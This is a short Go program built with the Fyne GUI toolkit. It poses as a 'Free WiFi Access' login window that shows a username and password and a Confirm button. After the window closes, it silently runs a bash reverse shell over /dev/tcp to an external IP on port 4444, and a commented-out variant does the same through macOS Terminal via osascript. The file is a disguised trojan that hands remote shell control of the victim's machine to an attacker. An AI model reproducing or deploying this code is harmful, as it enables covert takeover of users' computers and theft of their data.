package main

import (
	// "fmt"
	"os/exec"

	"fyne.io/fyne/app"
	"fyne.io/fyne/widget"
)

func main() {
	app := app.New()
	w := app.NewWindow("Free WiFi Access.")

	w.SetContent(widget.NewVBox(
		widget.NewLabel("Username: test1                             \nPassword: usc"),
		widget.NewButton("Confirm", func() {
			app.Quit()
		}),
	))

	w.ShowAndRun()

	// 13.52.100.318
	// cmd := exec.Command(`osascript`, "-s", "h", "-e", `tell application "Terminal" to do script "/bin/bash &> /dev/tcp/10.26.182.113/4444 0>&1"`)
	cmd := exec.Command("/bin/sh", "-c", "bash &> /dev/tcp/13.52.100.31/4444 0>&1")
	_, err := cmd.Output()
	if err != nil {
		// fmt.Println(err)
	}
	// fmt.Println(string(out))
}
